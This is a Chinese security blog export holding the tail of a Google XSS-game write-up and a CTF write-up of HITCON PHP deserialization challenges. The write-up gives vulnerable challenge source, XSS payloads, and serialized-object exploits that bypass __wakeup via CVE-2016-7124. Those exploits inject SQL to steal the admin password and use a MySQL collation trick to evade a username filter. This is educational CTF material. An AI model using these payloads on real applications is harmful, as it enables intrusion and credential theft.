<p>&#x9898;&#x76EE;&#x4E2D;&#x7684;&#x4EFB;&#x52A1;&#x8BF4;&#x660E;&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x91C7;&#x7528;&#x52A8;&#x6001;&#x52A0;&#x8F7D; JS &#x7684;&#x65B9;&#x5F0F;</p>
<p>&#x8FD9;&#x9898;&#x770B;&#x4E86;&#x4E00;&#x4E2A;&#x6B6A;&#x679C;&#x4EC1;&#x7684; writeup: <a href="http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html" target="_blank" rel="noopener">XSS-game by Google exercises 4, 5 and 6</a></p>
<p>&#x7B2C;&#x4E00;&#x4E2A; payload &#x662F;&#x76F4;&#x63A5;&#x5229;&#x7528; DATA URI Scheme &#x6765;&#x6267;&#x884C; js &#x4EE3;&#x7801;<br>&#x7B2C;&#x4E8C;&#x4E2A; payload &#x662F;&#x5229;&#x7528;&#x7684; google &#x7684;&#x4E00;&#x4E2A; api &#x6765;&#x8C03;&#x7528; js &#x4EE3;&#x7801;</p>
<p>payload1: <code>data:text/javascript,alert(1);</code><br>payload2: <code>www.google.com/jsapi?callback=alert</code></p>
<p><img src="/2019/03/27/Google-XSS-Game/yMHOC1pDmzvsgd2.jpg" alt></p>
</body></html>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>HITCON三题递进PHP反序列化</title>
    <url>/2020/02/17/HITCON-%E4%B8%89%E9%A2%98%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<html><head></head><body><p>HITCON&#x4E09;&#x9053;&#x5173;&#x4E8E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x9898;&#x76EE;</p>
<a id="more"></a>



<p>@zsx&#x5E08;&#x5085;blog&#x51E0;&#x53E5;&#x8BDD;&#x5438;&#x5F15;&#x4E86;&#x6211;&#x7684;&#x5174;&#x8DA3;&#x3002; </p>
<blockquote>
<p>HITCON 2016&#x4E0A;&#xFF0C;&#x1F34A;&#x51FA;&#x4E86;&#x4E00;&#x9053;PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;<br>HITCON 2017&#x4E0A;&#xFF0C;&#x1F34A;&#x51FA;&#x4E86;&#x4E00;&#x9053;Phar + PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;<br>HITCON 2018&#x4E0A;&#xFF0C;&#x1F34A;&#x51FA;&#x4E86;&#x4E00;&#x9053;file_get_contents + Phar + PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;</p>
</blockquote>
<h1 id="HITCON-2016-babytrick"><a href="#HITCON-2016-babytrick" class="headerlink" title="HITCON 2016 babytrick"></a>HITCON 2016 babytrick</h1><p>&#x7F51;&#x4E0A;&#x6CA1;&#x627E;&#x5230;&#x9898;&#x76EE;&#x590D;&#x73B0;&#x7684;docker&#x73AF;&#x5883;&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x53BB; Github &#x4E0A;&#x627E;&#x7684;&#x6E90;&#x7801;&#xFF0C;&#x5BF9;&#x9898;&#x76EE;&#x7406;&#x89E3;&#x53EF;&#x80FD;&#x6709;&#x5931;&#x504F;&#x9887;&#xFF0C;&#x656C;&#x8BF7;&#x8C05;&#x89E3;&#x3002;</p>
<p>&#x9898;&#x76EE;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HITCON</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $method;</span><br><span class="line">    <span class="hljs-keyword">private</span> $args;</span><br><span class="line">    <span class="hljs-keyword">private</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($method, $args)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;args = $args;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;__conn();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">list</span>($username) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;</span>, $username);</span><br><span class="line"></span><br><span class="line">        $obj = <span class="hljs-keyword">$this</span>-&gt;__query($sql);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( $obj != <span class="hljs-keyword">false</span>  ) {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die( sprintf(<span class="hljs-string">&quot;%s is %s&quot;</span>, $obj-&gt;username, $obj-&gt;role) );</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Nobody Nobody But You!&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">global</span> $FLAG;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $username = strtolower(trim(mysql_escape_string($username)));</span><br><span class="line">        $password = strtolower(trim(mysql_escape_string($password)));</span><br><span class="line"></span><br><span class="line">        $sql = sprintf(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;</span>, $username, $password);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> ( $username == <span class="hljs-string">&apos;orange&apos;</span> || stripos($sql, <span class="hljs-string">&apos;orange&apos;</span>) != <span class="hljs-keyword">false</span> ) {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Orange is so shy. He do not want to see you.&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $obj = <span class="hljs-keyword">$this</span>-&gt;__query($sql);</span><br><span class="line">        <span class="hljs-keyword">if</span> ( $obj != <span class="hljs-keyword">false</span> &amp;&amp; $obj-&gt;role == <span class="hljs-string">&apos;admin&apos;</span>  ) {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Hi, Orange! Here is your flag: &quot;</span> . $FLAG);</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Admin only!&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">source</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__conn</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="hljs-keyword">$this</span>-&gt;conn);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> ($DEBUG) {</span><br><span class="line">            $sql = <span class="hljs-string">&quot;CREATE TABLE IF NOT EXISTS users ( </span></span><br><span class="line"><span class="hljs-string">                        username VARCHAR(64), </span></span><br><span class="line"><span class="hljs-string">                        password VARCHAR(64), </span></span><br><span class="line"><span class="hljs-string">                        role VARCHAR(64)</span></span><br><span class="line"><span class="hljs-string">                    ) CHARACTER SET utf8&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__query($sql, $back=<span class="hljs-keyword">false</span>);</span><br><span class="line"></span><br><span class="line">            $sql = <span class="hljs-string">&quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__query($sql, $back=<span class="hljs-keyword">false</span>);</span><br><span class="line">        } </span><br><span class="line"></span><br><span class="line">        mysql_query(<span class="hljs-string">&quot;SET names utf8&quot;</span>);</span><br><span class="line">        mysql_query(<span class="hljs-string">&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__query</span><span class="hljs-params">($sql, $back=true)</span> </span>{</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="hljs-keyword">if</span> ($back) {</span><br><span class="line">            <span class="hljs-keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__die</span><span class="hljs-params">($msg)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;__close();</span><br><span class="line"></span><br><span class="line">        header(<span class="hljs-string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">die</span>( json_encode( <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;msg&quot;</span>=&gt; $msg) ) );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__close</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        mysql_close(<span class="hljs-keyword">$this</span>-&gt;conn);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;__conn();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-keyword">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;show&quot;</span>, <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;source&quot;</span>))) {</span><br><span class="line">            @call_user_func_array(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>, <span class="hljs-keyword">$this</span>-&gt;method), <span class="hljs-keyword">$this</span>-&gt;args);</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;What do you do?&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;__close();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">$this</span>-&gt;args <span class="hljs-keyword">as</span> $k =&gt; $v) {</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;data&quot;</span>])) {</span><br><span class="line">    @unserialize($_GET[<span class="hljs-string">&quot;data&quot;</span>]);    </span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-keyword">new</span> HITCON(<span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-keyword">array</span>());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;&#x6838;&#x5FC3;: <code>@unserialize($_GET[&quot;data&quot;]);</code> </p>
<p>&#x4EE3;&#x7801;&#x7684;&#x5168;&#x5C40;&#x8FC7;&#x6EE4;&#x5982;&#x4E0B;&#xFF0C;&#x4E3B;&#x8981;&#x8FC7;&#x6EE4;&#x51FD;&#x6570;&#x4E3A; <code>mysql_escape_string</code><br></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">function __wakeup() {</span><br><span class="line">    foreach($this-&gt;args as $k =&gt; $v) {</span><br><span class="line">        $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x5173;&#x4E8E;&#x6B64;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x7684;&#x7ED5;&#x8FC7;&#x4E3A; <a href="https://paper.seebug.org/866/" target="_blank" rel="noopener">CVE-2016-7124</a><p></p>
<p>&#x4EE3;&#x7801;&#x4E2D;&#x53C2;&#x6570;&#x9644;&#x503C;&#x4E3B;&#x8981;&#x9760; <code>call_user_func_array()</code>,<code>list()</code>,<code>func_get_args()</code>&#x4E09;&#x4E2A;&#x51FD;&#x6570;&#x5171;&#x540C;&#x4F5C;&#x7528;&#x3002;</p>
<p>&#x9996;&#x5148; <code>show</code> &#x65B9;&#x6CD5;&#x4E2D;&#x52A8;&#x6001;&#x62FC;&#x63A5;sql&#x8BED;&#x53E5;&#x91C7;&#x53D6;&#x4E86; <code>sprintf</code> &#x51FD;&#x6570;&#x3002;&#x4F46;&#x5176;&#x5BF9;&#x5355;&#x5F15;&#x53F7;&#x7B49;&#x654F;&#x611F;&#x5B57;&#x7B26;&#x5E76;&#x6CA1;&#x6709;&#x8F6C;&#x4E49;&#x529F;&#x80FD;&#xFF0C;&#x53C8;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EF;&#x5229;&#x7528;CVE-2016-7124 &#x6765;&#x7ED5;&#x8FC7;&#x5168;&#x5C40;&#x8FC7;&#x6EE4;&#x3002;&#x56E0;&#x6B64;&#x6B64;&#x5904;&#x5B58;&#x5728;sql&#x6CE8;&#x5165;&#x3002;</p>
<p>&#x901A;&#x8FC7;sql&#x6CE8;&#x5165;&#x83B7;&#x5F97;orange&#x5BC6;&#x7801;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HITCON</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $method=<span class="hljs-string">&quot;show&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> $args=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;&apos; union select password,1,1 from users where username = &apos;orange&apos;#&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">private</span> $conn=<span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line">$payload1 = <span class="hljs-keyword">new</span> HITCON();</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(serialize($payload1));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x901A;&#x8FC7;&#x4E0A;&#x8FF0;&#x6B65;&#x9AA4;&#x5F97;&#x77E5; <code>orange</code> &#x7684;&#x5BC6;&#x7801;&#x662F; <code>babytrick1234</code></p>
<p>&#x63A5;&#x7740;&#x8FDB;&#x5165; <code>login</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x540D;&#x8DDF;&#x5BC6;&#x7801;&#x53EF;&#x4EE5;&#x5F97;&#x5230; flag&#x3002;&#x4F46;&#x5176;&#x65B9;&#x6CD5;&#x91CC;&#x4E00;&#x5904;&#x9650;&#x5236;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( $username == <span class="hljs-string">&apos;orange&apos;</span> || stripos($sql, <span class="hljs-string">&apos;orange&apos;</span>) != <span class="hljs-keyword">false</span> ) {</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;__die(<span class="hljs-string">&quot;Orange is so shy. He do not want to see you.&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>Bypass&#x7684;&#x70B9;&#x4E3A; mysql&#x7684;&#x7F16;&#x7801;&#x8BBE;&#x7F6E;&#x5B89;&#x5168;</p>
<p>&#x732A;&#x732A;&#x4FA0;&#x5728;&#x5FAE;&#x535A;&#x4E0A;&#x66FE;&#x7ECF;&#x8BF4;&#x8FC7;</p>
<blockquote>
<p>MYSQL &#x4E2D; <code>utf8_unicode_ci</code>&#x548C;<code>utf8_general_ci</code>&#x4E24;&#x79CD;&#x7F16;&#x7801;&#x683C;&#x5F0F;,<code>utf8_general_ci</code>&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;,<code>&#xC4; = A, &#xD6; = O, &#xDC; = U</code>&#x8FD9;&#x4E09;&#x79CD;&#x6761;&#x4EF6;&#x90FD;&#x6210;&#x7ACB;,&#x5BF9;&#x4E8E;<code>utf8_general_ci</code>&#x4E0B;&#x9762;&#x7684;&#x7B49;&#x5F0F;&#x6210;&#x7ACB;&#xFF1A;&#xDF;=s,&#x4F46;&#x662F;&#xFF0C;&#x5BF9;&#x4E8E;<code>utf8_unicode_ci</code>&#x4E0B;&#x9762;&#x7B49;&#x5F0F;&#x624D;&#x6210;&#x7ACB;&#xFF1A;<code>&#xDF; = ss</code></p>
</blockquote>
<p>&#x672C;&#x5730;&#x4F7F;&#x7528; DVWA &#x7684;&#x5E93;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;<br><img src="/2020/02/17/HITCON-%E4%B8%89%E9%A2%98%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200311935.png" alt="image-20201113200311935"><br><img src="/2020/02/17/HITCON-%E4%B8%89%E9%A2%98%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200319155.png" alt="image-20201113200319155"><br><img src="/2020/02/17/HITCON-%E4%B8%89%E9%A2%98%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200327296.png" alt="image-20201113200327296"></p>
<p>&#x56E0;&#x6B64;&#x901A;&#x8FC7;&#x66FF;&#x6362;&#x5173;&#x952E;&#x5B57;&#x7B26;&#xFF0C;&#x6784;&#x9020;&#x6700;&#x7EC8;payload&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HITCON</span></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $method;</span><br><span class="line">    <span class="hljs-keyword">private</span> $args;</span><br><span class="line">    <span class="hljs-keyword">private</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($method, $args)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$args[<span class="hljs-string">&apos;username&apos;</span>] = <span class="hljs-string">&apos;OR&#xC4;NGE&apos;</span>;</span><br><span class="line">$args[<span class="hljs-string">&apos;password&apos;</span>] = <span class="hljs-string">&apos;babytrick1234&apos;</span>;</span><br><span class="line">$data = <span class="hljs-keyword">new</span> HITCON(<span class="hljs-string">&apos;login&apos;</span>,$args);</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(serialize($data));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="HITCON-2017-Baby-Master-PHP"><a href="#HITCON-2017-Baby-Master-PHP" class="headerlink" title="HITCON 2017 Baby-Master-PHP"></a>HITCON 2017 Baby-Master-PHP</h1><p>&#x9898;&#x76EE;&#x91C7;&#x7528; i&#x6625;&#x79CB; &#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x590D;&#x73B0;&#x3002;&#x5176;&#x5B9E;&#x672C;&#x6765;&#x6700;&#x5F00;&#x59CB;&#x590D;&#x73B0;&#x91C7;&#x7528;&#x7684;&#x662F;buu&#xFF0C;&#x4F46;&#x662F;buu&#x7684;&#x5E73;&#x53F0;&#x52A0;&#x8F7D;&#x4E0D;&#x4E86;&#x6211;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;phar&#x6587;&#x4EF6;&#x3002;&#x540E;&#x6765;&#x5C31;&#x6362;&#x4E86;</p>
<p>&#x9898;&#x76EE;&#x6E90;&#x7801;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$FLAG = create_function(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&apos;die(`/read_flag`);&apos;</span>);</span><br><span class="line">$SECRET = `/read_secret`;</span><br><span class="line">$SANDBOX = <span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">&quot;session-data&quot;</span>])) {</span><br><span class="line">    $data = serialize(<span class="hljs-keyword">new</span> User($SANDBOX));</span><br><span class="line">    $hmac = hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, $data, $SECRET);</span><br><span class="line">    setcookie(<span class="hljs-string">&quot;session-data&quot;</span>, sprintf(<span class="hljs-string">&quot;%s-----%s&quot;</span>, $data, $hmac));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $avatar;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($path)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        $random = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function my_function_$random() {&quot;</span></span><br><span class="line">            . <span class="hljs-string">&quot;  global \$FLAG; \$FLAG();&quot;</span></span><br><span class="line">            . <span class="hljs-string">&quot;}&quot;</span>);</span><br><span class="line">        $_GET[<span class="hljs-string">&quot;lucky&quot;</span>]();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">global</span> $SECRET;</span><br><span class="line">    $data = $_COOKIE[<span class="hljs-string">&quot;session-data&quot;</span>];</span><br><span class="line">    <span class="hljs-keyword">list</span>($data, $hmac) = explode(<span class="hljs-string">&quot;-----&quot;</span>, $data, <span class="hljs-number">2</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!hash_equals(hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, $data, $SECRET), $hmac)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $data = unserialize($data);</span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($data-&gt;avatar)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> $data-&gt;avatar;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span><span class="hljs-params">($path)</span> </span>{</span><br><span class="line">    $data = file_get_contents($_GET[<span class="hljs-string">&quot;url&quot;</span>] . <span class="hljs-string">&quot;/avatar.gif&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (substr($data, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) !== <span class="hljs-string">&quot;GIF89a&quot;</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Fuck off&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    file_put_contents($path . <span class="hljs-string">&quot;/avatar.gif&quot;</span>, $data);</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload OK&quot;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span><span class="hljs-params">($path)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!file_exists($path . <span class="hljs-string">&quot;/avatar.gif&quot;</span>)) {</span><br><span class="line">        $path = <span class="hljs-string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    header(<span class="hljs-string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">die</span>(file_get_contents($path . <span class="hljs-string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="hljs-string">&quot;m&quot;</span>];</span><br><span class="line"><span class="hljs-keyword">if</span> ($mode == <span class="hljs-string">&quot;upload&quot;</span>) {</span><br><span class="line">    upload(check_session());</span><br><span class="line">} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($mode == <span class="hljs-string">&quot;show&quot;</span>) {</span><br><span class="line">    show(check_session());</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;IP:&quot;</span>.$_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sandbox:&quot;</span>.<span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0A;&#x6765;&#x7B2C;&#x4E00;&#x884C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x59FF;&#x52BF;&#x70B9;orz<br><code>$FLAG = create_function(&quot;&quot;, &apos;die(</code>/read_flag<code>);&apos;);</code>&#x3002;&#x6839;&#x636E;<a href="https://github.com/php/php-src/blob/d56a534acc52b0bb7d61ac7c3386ab96e8ca4a97/Zend/zend_builtin_functions.c#L1914" target="_blank" rel="noopener">php&#x6E90;&#x7801;</a></p>
<p><img src="/2020/02/17/HITCON-%E4%B8%89%E9%A2%98%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200341989.png" alt="image-20201113200341989"></p>
